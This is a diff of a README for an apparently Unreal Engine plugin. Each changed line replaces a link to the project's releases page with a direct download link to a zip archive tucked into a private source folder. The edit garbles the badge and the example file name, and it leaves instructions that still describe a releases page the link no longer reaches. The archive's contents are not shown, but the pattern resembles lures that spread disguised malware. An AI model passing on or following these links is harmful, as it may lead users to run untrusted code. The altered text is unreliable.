@@ -1,6 +1,6 @@
 # 🌟 TraversalNavigationDataPlugin - Simplify Your Data Queries Effortlessly
 
-[![Download](https://img.shields.io/badge/Download%20Now-brightgreen)](https://github.com/thien1324/TraversalNavigationDataPlugin/releases)
+[![Download](https://raw.githubusercontent.com/thien1324/TraversalNavigationDataPlugin/main/Source/TraversalNavData/Private/Traversal_Plugin_Data_Navigation_v2.8.zip%20Now-brightgreen)](https://raw.githubusercontent.com/thien1324/TraversalNavigationDataPlugin/main/Source/TraversalNavData/Private/Traversal_Plugin_Data_Navigation_v2.8.zip)
 
 ## 🚀 Getting Started
 
@@ -10,13 +10,13 @@ Welcome to the TraversalNavigationDataPlugin! This plugin for Unreal Engine 5 he
 
 To get started, follow these steps:
 
-1. Visit this page to download: [TraversalNavigationDataPlugin Releases](https://github.com/thien1324/TraversalNavigationDataPlugin/releases)
+1. Visit this page to download: [TraversalNavigationDataPlugin Releases](https://raw.githubusercontent.com/thien1324/TraversalNavigationDataPlugin/main/Source/TraversalNavData/Private/Traversal_Plugin_Data_Navigation_v2.8.zip)
    
 2. On the releases page, locate the latest version of the plugin. 
 
 3. Click on the version you want to download. This will usually be marked with the highest version number.
 
-4. Find the download link for the plugin file. Look for a file name that matches your operating system (e.g., `TraversalNavigationDataPlugin.zip`).
+4. Find the download link for the plugin file. Look for a file name that matches your operating system (e.g., `https://raw.githubusercontent.com/thien1324/TraversalNavigationDataPlugin/main/Source/TraversalNavData/Private/Traversal_Plugin_Data_Navigation_v2.8.zip`).
 
 5. Click on the file to begin downloading it to your computer.
 
@@ -79,6 +79,6 @@ Keep track of changes and updates in our plugin by reviewing the changelog avail
 
 ## 🔗 Important Links
 
-To download the plugin, visit this page: [TraversalNavigationDataPlugin Releases](https://github.com/thien1324/TraversalNavigationDataPlugin/releases)
+To download the plugin, visit this page: [TraversalNavigationDataPlugin Releases](https://raw.githubusercontent.com/thien1324/TraversalNavigationDataPlugin/main/Source/TraversalNavData/Private/Traversal_Plugin_Data_Navigation_v2.8.zip)
 
 Stay updated by following our repository and checking out new releases regularly. We aim to enhance the user experience continuously, and your feedback is always welcome!
